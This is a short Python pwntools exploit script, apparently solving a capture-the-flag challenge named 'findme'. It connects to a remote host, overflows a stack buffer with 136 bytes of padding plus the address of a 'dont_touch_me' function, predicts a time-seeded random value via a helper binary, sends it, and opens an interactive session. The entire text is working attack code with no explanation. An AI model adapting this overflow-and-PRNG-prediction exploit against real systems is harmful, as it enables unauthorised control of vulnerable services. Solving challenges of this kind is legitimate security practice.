#!/usr/bin/env python

from pwn import *

e = ELF("./findme")
dont_touch_me_addr = e.sym["dont_touch_me"]

offset = 136

p = remote("159.65.13.76", 63003)
#p = process("./findme")

payload = 'A' * offset + p64(dont_touch_me_addr)[:-2]

# send buffer overflow
p.recvuntil("token:")
p.sendline(payload)

# get random with srand(time(NULL))'s seed
rand_int = process("./get_rand")
rand_bytes = rand_int.recv(4)

#local_c's size is 4 bytes long
local_c = int.from_bytes(rand_bytes, byteorder='little', signed=True)

# send n
p.sendline(p32(local_c))
p.interactive()
